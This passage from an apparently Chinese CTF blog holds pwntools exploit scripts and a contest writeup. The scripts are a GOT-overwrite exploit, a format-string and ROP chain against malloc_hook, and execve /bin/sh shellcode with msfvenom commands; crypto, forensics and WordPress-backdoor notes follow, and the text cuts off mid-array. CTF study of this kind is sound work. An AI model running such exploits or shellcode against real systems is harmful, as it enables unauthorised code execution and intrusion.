class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</div><div class="line">context(log_level=<span class="string">"debug"</span>)</div><div class="line">DEBUG = <span class="number">1</span></div><div class="line"><span class="comment">#socat TCP4-LISTEN:10001,fork EXEC:./pwn1</span></div><div class="line">target = <span class="string">"./pwn"</span></div><div class="line">remote_ip = <span class="string">""</span></div><div class="line">port = <span class="number">0</span></div><div class="line">rop = roputils.ROP(target)</div><div class="line">elf = ELF(target)</div><div class="line"><span class="comment"># lib = cdll.LoadLibrary('./libc64.so')</span></div><div class="line"><span class="comment"># payload = rop.call('__isoc99_scanf', 0x804888F,0x0804A034)</span></div><div class="line"><span class="comment"># libc = ELF[target]</span></div><div class="line"><span class="comment"># msfvenom -p linux/x86/exec CMD=/bin/sh -b "\x0b\x00" -f python</span></div><div class="line"><span class="comment">#buf =  ""</span></div><div class="line"><span class="comment"># buf += "\x2b\xc9\x83\xe9\xf5\xe8\xff\xff\xff\xff\xc0\x5e\x81"</span></div><div class="line"><span class="comment"># buf += "\x76\x0e\x7d\x30\x90\xf9\x83\xee\xfc\xe2\xf4\x17\x3b"</span></div><div class="line"><span class="comment"># buf += "\xc8\x60\x2f\x56\xf8\xd4\x1e\xb9\x77\x91\x52\x43\xf8"</span></div><div class="line"><span class="comment"># buf += "\xf9\x15\x1f\xf2\x90\x13\xb9\x73\xab\x95\x38\x90\xf9"</span></div><div class="line"><span class="comment"># buf += "\x7d\x1f\xf2\x90\x13\x1f\xe3\x91\x7d\x67\xc3\x70\x9c"</span></div><div class="line"><span class="comment"># buf += "\xfd\x10\xf9"</span></div><div class="line"></div><div class="line"><span class="comment"># int 0x80 linux x86 0x1c</span></div><div class="line"><span class="comment"># buf = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80";</span></div><div class="line"></div><div class="line"></div><div class="line"><span class="comment"># bss = rop.section('.bss')</span></div><div class="line"><span class="comment"># rop.got('puts')</span></div><div class="line"><span class="comment"># rop.call('read', 0, addr_bss, 0x100)</span></div><div class="line"><span class="comment"># msfvenom -p linux/x86/exec CMD=/bin/sh -f python -b '\x00\x0b\x0d\x0a'</span></div><div class="line"></div><div class="line"><span class="comment"># def exec_fmt(payload):</span></div><div class="line"><span class="comment"># 	p = process(target)</span></div><div class="line"><span class="comment"># 	p.recvuntil("input:")</span></div><div class="line"><span class="comment"># 	p.sendline(payload)</span></div><div class="line"><span class="comment"># 	p.recvuntil("input:")</span></div><div class="line"><span class="comment"># 	p.sendline(payload)</span></div><div class="line"><span class="comment"># 	return p.recvuntil(",")[:-1]</span></div><div class="line"><span class="comment"># autofmt = FmtStr(exec_fmt)</span></div><div class="line"><span class="comment"># offset = autofmt.offset</span></div><div class="line"></div><div class="line"><span class="comment"># def send_payload(payload):</span></div><div class="line"><span class="comment"># 	sl(payload+"%100000c")</span></div><div class="line"><span class="comment"># autofmt = FmtStr(send_payload,offset=offset)</span></div><div class="line"></div><div class="line"><span class="comment"># autofmt.write(free_hook_addr,one_gadget_addr)</span></div><div class="line"><span class="comment"># autofmt.execute_writes()</span></div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">if</span> DEBUG:</div><div class="line">	p = process(target,env=&#123;<span class="string">"LD_LIBRARY_PATH"</span>:sys.path[<span class="number">0</span>]&#125;)</div><div class="line">	<span class="comment"># gdb.attach(p,"b*main\nc")</span></div><div class="line"><span class="keyword">else</span>:</div><div class="line">	p = remote(remote_ip,port)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">sl</span><span class="params">(data)</span>:</span></div><div class="line">	p.sendline(data)</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">sd</span><span class="params">(data)</span>:</span></div><div class="line">	p.send(data)</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">ru</span><span class="params">(data)</span>:</span></div><div class="line">	<span class="keyword">return</span> p.recvuntil(data)</div><div class="line"></div><div class="line"></div><div class="line">ru(<span class="string">"exit\n"</span>)</div><div class="line">sl(<span class="string">"2"</span>)</div><div class="line"></div><div class="line"><span class="comment"># change atoi to printf</span></div><div class="line">ru(<span class="string">"Exit\n"</span>)</div><div class="line">sl(<span class="string">"5"</span>)</div><div class="line">ru(<span class="string">"\n"</span>)</div><div class="line">sl(<span class="string">"y"</span>)</div><div class="line">ru(<span class="string">"\n"</span>)</div><div class="line"></div><div class="line">payload = p64(elf.symbols[<span class="string">"printf"</span>])+<span class="string">"\n"</span></div><div class="line">payload = payload.ljust(<span class="number">0x20</span>,<span class="string">"\x00"</span>)</div><div class="line">payload +=p64(elf.got[<span class="string">"atoi"</span>])</div><div class="line">sd(payload)</div><div class="line"></div><div class="line">ru(<span class="string">"Exit\n"</span>)</div><div class="line">sl(<span class="string">"%7$s...."</span>+p64(elf.got[<span class="string">"printf"</span>]))</div><div class="line">printf_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">"\x00"</span>))</div><div class="line">offset = <span class="number">0x0000000000054b50</span> - <span class="number">0x0000000000044380</span></div><div class="line">system_addr = printf_addr-offset</div><div class="line"></div><div class="line"><span class="comment"># change atoi to system</span></div><div class="line"></div><div class="line">ru(<span class="string">"Exit\n"</span>)</div><div class="line">sl(<span class="string">"a"</span>*<span class="number">5</span>)</div><div class="line">ru(<span class="string">"y/n)\n"</span>)</div><div class="line">sl(<span class="string">"y"</span>)</div><div class="line">ru(<span class="string">"nd up with '\\n')\n"</span>)</div><div class="line"></div><div class="line">payload = p64(system_addr)+<span class="string">"\n"</span></div><div class="line">payload = payload.ljust(<span class="number">0x20</span>,<span class="string">"\x00"</span>)</div><div class="line">payload +=p64(elf.got[<span class="string">"atoi"</span>])</div><div class="line">sd(payload)</div><div class="line"></div><div class="line"><span class="comment"># \n</span></div><div class="line">sl(<span class="string">"/bin/sh\x00"</span>)</div><div class="line"></div><div class="line">p.interactive()</div></pre></td></tr></table></figure>]]></content>
      
        
        <tags>
            
            <tag> pwn </tag>
            
            <tag> awd </tag>
            
            <tag> web </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[8月9日个人赛总结 && writeup]]></title>
      <url>/2017/08/10/2017-8-9/</url>
      <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>还好这次比赛网络环境比较差，主办方被迫放了许多离线题，让我这只bin dog有机可乘（手动滑稽），但这次比赛也确实发现自身的web能力有限，对于一些简单的web题竟然出现无从下手的情况。。也借这次比赛总结下离线环境下一些特殊操作吧。</p>
<h3 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h3><p>对于一些密码类的题目，手头有合适的工具最好了，但很多情况下，工具并不适用，比如这次比赛中，出现的aes解密，不清楚加密模式，需要输入iv和key，而手头的工具只可以输入key，且加密模式确定，没办法，只能去找库，不过比较幸运的是，之前安装过一个crypt的python库，看里面的源码，竟然有aes加密的说明，简单的倒推一下就能够推出解密脚本。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</div><div class="line">key = <span class="string">b'EaRncVfLgIPMaygA'</span></div><div class="line">iv = <span class="string">b'HDkMsMEzkkzyQLTH'</span></div><div class="line">cipher = AES.new(key, AES.MODE_CBC, iv)</div><div class="line">msg = iv + base64.b64decode(<span class="string">"kWZnRZMZv9JJLcD4v6o19iFKHOhc/S1Dv5y3r2YxhnRuWE8w/ji0jr0VFAGDbfzyQLcONBtB6pjetkHggUPv/rUmXoSfTnnWJ/cfv9deT56KoxwtXMGO4LJyXakTPE2tMcu0UexsnlhfhlqUE2vGnNnNUm996thkRlp3v36OfwgVGfT22UVjv+lpk0lKXgT2liQm/eBRilEaPw4o6P29YV7zN3AqI2y5Sa+I13o53cwO9JNOCXC28wuYSBrbOauu61VGj9MroQ3Si5swvx4p8vzyZZd5SkjIJ69AFi6pGPxnptofigIS5NRvVYLady+n0IWDj32whAPinOHcB8t3qJH1YtwNf9ly7gFQUgqCEXXDuRTcercMxe72siNNtg1LZTVQJLViD4G1ROdrh9Lic2BTe/9mAt/mKeRIaXJDHrTTu/d6xao4P995xjhSAhkD+cgbuOCgwhkpVH6cyRR+aFKFBv6UVZzob4s7ul9Xjzc9ETBaoE8CoAXLSZ5zEGs0jEbL0Hf5SdenlISyny97BFnqiGXRQCwBIacq+ytw/VK6DC2ddHAOndZ5K/zmnE0WuccCDTQ8gskaswFpbSG4q47HaN8t/VNug4NfZSGE/kbf+rW7QGlwMF66ksxhpthlkXJkICbpgnHNwsAjZnDhN1t9SDms4EIbozHaopiH79gy+h3N8lk/85OJfM0rac5CGcFlO9Tgf0ov6cGe8ABTIw1tFKZIcXWqETIbl60WCgBxmJFsBbl0ikDDyTsxSn8cNK8bVymqmL5TuTM2clBhd/rV44nA5vCGAnEKzfEHoV3YFc4gik8/nUutDmxJdjeqrd7M0Lm0QKpVPl8ATA5Tf2PKTJ9CaxIiLyazY74D2egqYZzddjq4aXXNPWgwYk5OKAZz+avRMJWu+ACx0wlih0ScOor4PMbpRqSc8oEjmeg="</span>)</div><div class="line">cipher.decrypt(msg)</div></pre></td></tr></table></figure>
<p>对于zip压缩包，还是archpr好用。。</p>
<p>对于web弱口令还需要准备一本字典，其实早就应该准备了，包括一些bypass waf的字典，网站扫描的字典，经过这次比赛，发现对于web题而言，字典是多么重要。</p>
<p>对于线下赛，webshellkill是一款好工具，可以直接利用其来找容易发现的一句话后门。（不过自己也需要写一个利用命令执行自动种马的脚本）</p>
<p>rasctftools没有共模攻击的利用方式（这次比赛吃亏了！应该还有它没有的其他攻击方式）</p>
<p>线下赛的web waf需要完善。</p>
<p>新的pyc加密方式  <code>stegosaurus</code></p>
<p>writeup 如下<br><a id="more"></a></p>
<h3 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h3><p>打开文件。。发现又要压缩密码。。。ORZ</p>
<p>linux/x86下一段汇编代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">xor %eax, %eax</div><div class="line">xor %ebx, %ebx</div><div class="line">xor %ecx, %ecx</div><div class="line">push %ecx</div><div class="line">push $0x68732f2f</div><div class="line">push $0x6e69622f</div><div class="line">movl %esp,%ebx</div><div class="line">movb $11,%al</div><div class="line">int $0x80</div></pre></td></tr></table></figure></p>
<p>请将其提取为可用的shellcode,形式如\x01\x2d\x……的代码(字母小写)，shellcode的小写MD5<br>值为解压密码，上用pwntools的asm函数，将这些操作指令反汇编成机器码，如下</p>
<p><code>\x31\xc0\x31\xdb\x31\xc9\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80</code></p>
<p>然后再用题目提供的md5计算器计算下md5即可。</p>
<p><code>68f3e981152d37d372d732d0c3ee3977</code></p>
<p>接着常规套路，IDA打开分析一波，等等？？这pwn文件怎么那么熟悉= =。。  这不是全国大学生信安赛pwn3么，原题。。。虽然当时没做出来，但是后来看着别人的writeup复现了，exp还在本地，但是执行的时候，没有拿到shell，再看了下pwn文件，发现很多地址都有变动。</p>
<p>变动的数据</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">stack_povit = 0x00000000004b93f8</div><div class="line">pop_rdi_ret = 0x00000000004005d5</div><div class="line">fake_fsp = 0x06CCC10</div><div class="line">malloc_hook = 0x6CB788</div><div class="line">read_buf = 0x400AEE</div></pre></td></tr></table></figure>
<p>具体的思路的话，还是利用格式化字符串的漏洞，修改malloc_hook的数据，让其在接受比较大的参数数据的时候执行malloc，比如”%100000c”,我们便可以控制执行流了。但是这边是静态编译，也不能狗利用one_gadget，很绝望，然而我们可以构造裸的rop来调用syscall（hhhhh），首先得找一个stack_povit，使我们的栈空间得到迁移，在这迁移的栈空间上构造我们的rop，然后触发ret，执行我们的rop，就拿到shell啦，下面是exp。。。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/env python</span></div><div class="line"><span class="comment"># -*- coding: utf-8 -*-</span></div><div class="line"><span class="comment"># @Author  : WinterSun (511683586@qq.com)</span></div><div class="line"><span class="comment"># @Link    : https://Winter3un.github.io/</span></div><div class="line"><span class="comment"># import roputils,os,time</span></div><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</div><div class="line">context(log_level=<span class="string">"debug"</span>)</div><div class="line">DEBUG = <span class="number">0</span></div><div class="line">target = <span class="string">"./pwn1"</span></div><div class="line">remote_ip = <span class="string">"172.16.2.10"</span></div><div class="line">port = <span class="number">20000</span></div><div class="line"><span class="comment"># rop = roputils.ROP(target)</span></div><div class="line"><span class="comment"># elf = ELF(target)</span></div><div class="line"><span class="comment"># lib = cdll.LoadLibrary('./libc64.so')</span></div><div class="line"><span class="comment"># payload = rop.call('__isoc99_scanf', 0x804888F,0x0804A034)</span></div><div class="line"><span class="comment"># libc = ELF[target]</span></div><div class="line"><span class="comment"># msfvenom -p linux/x86/exec CMD=/bin/sh -b "\x0b\x00" -f python</span></div><div class="line"><span class="comment">#buf =  ""</span></div><div class="line"><span class="comment"># buf += "\x2b\xc9\x83\xe9\xf5\xe8\xff\xff\xff\xff\xc0\x5e\x81"</span></div><div class="line"><span class="comment"># buf += "\x76\x0e\x7d\x30\x90\xf9\x83\xee\xfc\xe2\xf4\x17\x3b"</span></div><div class="line"><span class="comment"># buf += "\xc8\x60\x2f\x56\xf8\xd4\x1e\xb9\x77\x91\x52\x43\xf8"</span></div><div class="line"><span class="comment"># buf += "\xf9\x15\x1f\xf2\x90\x13\xb9\x73\xab\x95\x38\x90\xf9"</span></div><div class="line"><span class="comment"># buf += "\x7d\x1f\xf2\x90\x13\x1f\xe3\x91\x7d\x67\xc3\x70\x9c"</span></div><div class="line"><span class="comment"># buf += "\xfd\x10\xf9"</span></div><div class="line"></div><div class="line"><span class="comment"># int 0x80 linux x86 0x1c</span></div><div class="line"><span class="comment"># buf = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80";</span></div><div class="line"></div><div class="line"></div><div class="line"><span class="comment"># bss = rop.section('.bss')</span></div><div class="line"><span class="comment"># rop.got('puts')</span></div><div class="line"><span class="comment"># rop.call('read', 0, addr_bss, 0x100)</span></div><div class="line"><span class="comment"># msfvenom -p linux/x86/exec CMD=/bin/sh -f python -b '\x00\x0b\x0d\x0a'</span></div><div class="line"></div><div class="line"><span class="comment"># def exec_fmt(payload):</span></div><div class="line"><span class="comment"># 	p = process(target)</span></div><div class="line"><span class="comment"># 	p.recvuntil("input:")</span></div><div class="line"><span class="comment"># 	p.sendline(payload)</span></div><div class="line"><span class="comment"># 	p.recvuntil("input:")</span></div><div class="line"><span class="comment"># 	p.sendline(payload)</span></div><div class="line"><span class="comment"># 	return p.recvuntil(",")[:-1]</span></div><div class="line"><span class="comment"># autofmt = FmtStr(exec_fmt)</span></div><div class="line"><span class="comment"># offset = autofmt.offset</span></div><div class="line"></div><div class="line"><span class="comment"># def send_payload(payload):</span></div><div class="line"><span class="comment"># 	sl(payload+"%100000c")</span></div><div class="line"><span class="comment"># autofmt = FmtStr(send_payload,offset=offset)</span></div><div class="line"></div><div class="line"><span class="comment"># autofmt.write(free_hook_addr,one_gadget_addr)</span></div><div class="line"><span class="comment"># autofmt.execute_writes()</span></div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">if</span> DEBUG:</div><div class="line">	p = process(target,env=&#123;<span class="string">"LD_LIBRARY_PATH"</span>:sys.path[<span class="number">0</span>]&#125;)</div><div class="line"></div><div class="line">	<span class="comment"># gdb.attach(p,"b*0x400B69\nc")</span></div><div class="line"><span class="keyword">else</span>:</div><div class="line">	p = remote(remote_ip,port)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">sl</span><span class="params">(data)</span>:</span></div><div class="line">	p.sendline(data)</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">sd</span><span class="params">(data)</span>:</span></div><div class="line">	p.send(data)</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">ru</span><span class="params">(data)</span>:</span></div><div class="line">	<span class="keyword">return</span> p.recvuntil(data)</div><div class="line"></div><div class="line"></div><div class="line">stack_povit = <span class="number">0x00000000004b93f8</span></div><div class="line">pop_rdi_ret = <span class="number">0x00000000004005d5</span></div><div class="line">fake_fsp = <span class="number">0x06CCC10</span></div><div class="line">malloc_hook = <span class="number">0x6CB788</span></div><div class="line">read_buf = <span class="number">0x400AEE</span></div><div class="line"></div><div class="line"></div><div class="line"><span class="comment"># payload = 'A'*8+"%6$n\0"</span></div><div class="line">l = []</div><div class="line">l.append((stack_povit ) &amp;<span class="number">0xffff</span>)</div><div class="line">l.append((stack_povit &gt;&gt; <span class="number">0x10</span>) &amp;<span class="number">0xffff</span>)</div><div class="line">l.append((pop_rdi_ret) &amp;<span class="number">0xffff</span>)</div><div class="line">l.append((pop_rdi_ret &gt;&gt; <span class="number">0x10</span>) &amp;<span class="number">0xffff</span>)</div><div class="line">l.append((fake_fsp) &amp; <span class="number">0xffff</span>)</div><div class="line">l.append((fake_fsp &gt;&gt; <span class="number">0x10</span>) &amp;<span class="number">0xffff</span>)</div><div class="line">l.append((read_buf) &amp; <span class="number">0xffff</span>)</div><div class="line">l.append((read_buf &gt;&gt; <span class="number">0x10</span>) &amp; <span class="number">0xffff</span>)</div><div class="line"></div><div class="line">payload = <span class="string">""</span></div><div class="line">delta = <span class="number">0</span></div><div class="line">printed = <span class="number">0</span></div><div class="line">index = <span class="number">6</span> + <span class="number">14</span> <span class="comment"># target addr</span></div><div class="line"><span class="keyword">for</span> data <span class="keyword">in</span> l:</div><div class="line">	delta = (data-printed)&amp;<span class="number">0xffff</span></div><div class="line">	payload +=  <span class="string">'%'</span>+str(delta)+<span class="string">'c'</span>+<span class="string">'%'</span>+str(index)+<span class="string">'$hn'</span></div><div class="line">	printed += delta</div><div class="line">	index += <span class="number">1</span></div><div class="line"><span class="comment"># payload+=(len(payload)%8)*'A'</span></div><div class="line">payload +=<span class="string">"%"</span>+str(fake_fsp<span class="number">-0x20</span>)+<span class="string">"s"</span></div><div class="line">payload = payload.ljust(<span class="number">14</span>*<span class="number">8</span>,<span class="string">'a'</span>)</div><div class="line"></div><div class="line"><span class="comment"># target addr</span></div><div class="line">payload += p64(malloc_hook)</div><div class="line">payload += p64(malloc_hook+<span class="number">2</span>)</div><div class="line">payload += p64(fake_fsp)</div><div class="line">payload += p64(fake_fsp+<span class="number">2</span>)</div><div class="line">payload += p64(fake_fsp+<span class="number">8</span>)</div><div class="line">payload += p64(fake_fsp+<span class="number">0xa</span>)</div><div class="line">payload += p64(fake_fsp+<span class="number">0x10</span>)</div><div class="line">payload += p64(fake_fsp+<span class="number">0x12</span>)</div><div class="line"></div><div class="line"></div><div class="line">sl(payload)</div><div class="line"></div><div class="line">pop_rdi_ret = <span class="number">0x00000000004005d5</span></div><div class="line">pop_rdx_rsi_ret = <span class="number">0x0000000000442a99</span></div><div class="line">pop_rax_rdx_rbx_ret = <span class="number">0x0000000000479836</span></div><div class="line">syscall = <span class="number">0x4004ce</span></div><div class="line">rop = <span class="string">"aaaa\x17"</span></div><div class="line">rop += p64(pop_rdi_ret)+p64(fake_fsp+<span class="number">0x50</span>+<span class="number">0x18</span>)</div><div class="line">rop += p64(pop_rdx_rsi_ret)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)</div><div class="line">rop += p64(pop_rax_rdx_rbx_ret)+p64(<span class="number">0x3b</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)</div><div class="line">rop += p64(syscall)</div><div class="line">rop += <span class="string">"/bin/sh\x00"</span></div><div class="line">rop += <span class="string">"/bin/sh\x00"</span></div><div class="line"></div><div class="line"></div><div class="line">sl(rop)</div><div class="line"><span class="comment"># payload = "%6$hn"</span></div><div class="line"></div><div class="line"></div><div class="line">p.interactive()</div><div class="line"><span class="comment"># flag&#123;9d3db853efce91066f22f1bc09aea6&#125;</span></div></pre></td></tr></table></figure>
<h3 id="XOR"><a href="#XOR" class="headerlink" title="XOR"></a>XOR</h3><p>看了加密脚本。。可以直接写出解密脚本，流程基本上没有变化。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack, unpack</div><div class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64encode</div><div class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64decode</div><div class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randint</div><div class="line"></div><div class="line"><span class="keyword">with</span> open(<span class="string">'flag.enc'</span>, <span class="string">'r'</span>) <span class="keyword">as</span> f:</div><div class="line">	s = f.read()</div><div class="line">p = b64decode(s)</div><div class="line"></div><div class="line"></div><div class="line">blocks = unpack(<span class="string">'I'</span> * (len(p) / <span class="number">4</span>), p)</div><div class="line">result = [block ^ block &gt;&gt; <span class="number">16</span> <span class="keyword">for</span> block <span class="keyword">in</span> blocks]</div><div class="line">ciphertext = (<span class="string">''</span>.join(pack(<span class="string">'I'</span>,block) <span class="keyword">for</span> block <span class="keyword">in</span> result))</div><div class="line"></div><div class="line"><span class="keyword">print</span> ciphertext[::<span class="number">-1</span>]</div></pre></td></tr></table></figure>
<h3 id="moudle"><a href="#moudle" class="headerlink" title="moudle"></a>moudle</h3><p>其实题目名字已经提示了很多了，但是。。我在赛场上竟然蠢的只看了其中一个公钥文件0 0，然后GG。常规思路，用rsatools跑了一下，发现没有任何信息，赛后得知其实RSA共模攻击，0 0蠢的想扇死自己。。。</p>
<h3 id="findme"><a href="#findme" class="headerlink" title="findme"></a>findme</h3><p>比较良心，没去掉后缀名，用winhex转换磁盘镜像获得磁盘回收站内的zip文件，然后需要解密ORZ，以为是伪加密，但是不存在的，010打开，发现zip文件末尾存在额外数据，尝试用gbk解码，发现提示。用工具很快就能爆破出密码。stegslove打开，在其额外数据段发现其内存在flag= = </p>
<h3 id="pyc"><a href="#pyc" class="headerlink" title="pyc"></a>pyc</h3><p>使用GitTools恢复出了四个历史文件夹，其中两个里面发现了存在数据，一个是pyc文件，还有一个压缩包，不知道干嘛的，010打开pyc文件，发现有密码，一开始没有在意，用常规思路，去逆向pyc，发现不存在的，后来试着用刚刚发现的密码去解压压缩文件，发现有现成的攻击可以跑。。。ORZ<br>跑出来就是flag</p>
<h3 id="pcap"><a href="#pcap" class="headerlink" title="pcap"></a>pcap</h3><p>用<code>NetworkMiner</code>提取数据，发现存在几个图片文件和一个密文，提示是aes，尝试用aes去破解，获得png数据，生成图片后，扫码获得flag</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">key = <span class="string">b'EaRncVfLgIPMaygA'</span></div><div class="line">iv = <span class="string">b'HDkMsMEzkkzyQLTH'</span></div><div class="line">cipher = AES.new(key, AES.MODE_ECB, iv)</div><div class="line">msg = iv + base64.b64decode(<span class="string">"kWZnRZMZv9JJLcD4v6o19iFKHOhc/S1Dv5y3r2YxhnRuWE8w/ji0jr0VFAGDbfzyQLcONBtB6pjetkHggUPv/rUmXoSfTnnWJ/cfv9deT56KoxwtXMGO4LJyXakTPE2tMcu0UexsnlhfhlqUE2vGnNnNUm996thkRlp3v36OfwgVGfT22UVjv+lpk0lKXgT2liQm/eBRilEaPw4o6P29YV7zN3AqI2y5Sa+I13o53cwO9JNOCXC28wuYSBrbOauu61VGj9MroQ3Si5swvx4p8vzyZZd5SkjIJ69AFi6pGPxnptofigIS5NRvVYLady+n0IWDj32whAPinOHcB8t3qJH1YtwNf9ly7gFQUgqCEXXDuRTcercMxe72siNNtg1LZTVQJLViD4G1ROdrh9Lic2BTe/9mAt/mKeRIaXJDHrTTu/d6xao4P995xjhSAhkD+cgbuOCgwhkpVH6cyRR+aFKFBv6UVZzob4s7ul9Xjzc9ETBaoE8CoAXLSZ5zEGs0jEbL0Hf5SdenlISyny97BFnqiGXRQCwBIacq+ytw/VK6DC2ddHAOndZ5K/zmnE0WuccCDTQ8gskaswFpbSG4q47HaN8t/VNug4NfZSGE/kbf+rW7QGlwMF66ksxhpthlkXJkICbpgnHNwsAjZnDhN1t9SDms4EIbozHaopiH79gy+h3N8lk/85OJfM0rac5CGcFlO9Tgf0ov6cGe8ABTIw1tFKZIcXWqETIbl60WCgBxmJFsBbl0ikDDyTsxSn8cNK8bVymqmL5TuTM2clBhd/rV44nA5vCGAnEKzfEHoV3YFc4gik8/nUutDmxJdjeqrd7M0Lm0QKpVPl8ATA5Tf2PKTJ9CaxIiLyazY74D2egqYZzddjq4aXXNPWgwYk5OKAZz+avRMJWu+ACx0wlih0ScOor4PMbpRqSc8oEjmeg="</span>)</div><div class="line">cipher.decrypt(msg)</div></pre></td></tr></table></figure>
<h3 id="wordpress"><a href="#wordpress" class="headerlink" title="wordpress"></a>wordpress</h3><p>按照提示做出来的，本来可以用find命令查最近修改文件的日期来获取信息，但是命令忘了，又不能够连接网络ORZ。。。提示是存在后门。grep一下eval(找到后门文件，接下来常规思路。(赛后得知可以用killshell来快速查找后门的，找后门的还有几个工具，有时间得拿出来比较实验以下~web弱渣了ORZ)</p>
<h3 id="Replace"><a href="#Replace" class="headerlink" title="Replace"></a>Replace</h3><p>解压缩包密码的过程就不说了吧，很无聊</p>
<p>直接upx解壳，<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">a = [<span class="number">0x63</span>,<span class="number">0x7C</span>,<span class="number">0x77</span>,<span class="number">0x7B</span>,<span class="number">0x0F2</span>,<span class="number">0x6B</span>,<span class="number">0x6F</span>,<span class="number">0x0C5</span>,<span class="number">0x30</span>,<span class="number">0x1</span>,<span class="number">0x67</span>,<span class="number">0x2B</span>,<span class="number">0x0FE</span>,<span class="number">0x0D7</span>,<span class="number">0x0AB</span>,<span class="number">0x76</span>,<span class="number">0x0CA</span>,<span class="number">0x82</span>,<span class="number">0x0C9</span>,<span 